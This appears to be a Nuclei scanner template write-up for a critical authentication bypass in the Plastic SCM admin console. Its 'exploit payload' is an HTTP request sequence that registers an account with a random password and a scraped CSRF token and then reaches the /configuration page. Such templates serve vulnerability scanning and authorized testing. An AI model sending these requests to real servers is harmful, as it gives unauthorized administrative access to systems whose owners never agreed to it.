# Nuclei Template: Plastic Admin Console - Authentication Bypass
**Template ID:** unauthorized-plastic-scm
**Vulnerability Class:** Authentication Bypass Using an Alternate Path or Channel
**Severity:** Critical
**CWE:** CWE-288
**Source:** Nuclei Template (`unauthorized-plastic-scm.yaml`)

## Vulnerability Information & PoC

## Description
A Plastic Admin console was discovered.

## Steps to reproduce / Exploit Payload
```http
GET /account/register HTTP/1.1
{{Hostname}}

POST /account/register HTTP/1.1
Host: {{Hostname}}
Origin: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/account/register
Connection: close

Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false

GET /configuration HTTP/1.1
{{Hostname}}
```

## References
- https://infosecwriteups.com/story-of-google-hall-of-fame-and-private-program-bounty-worth-53559a95c468
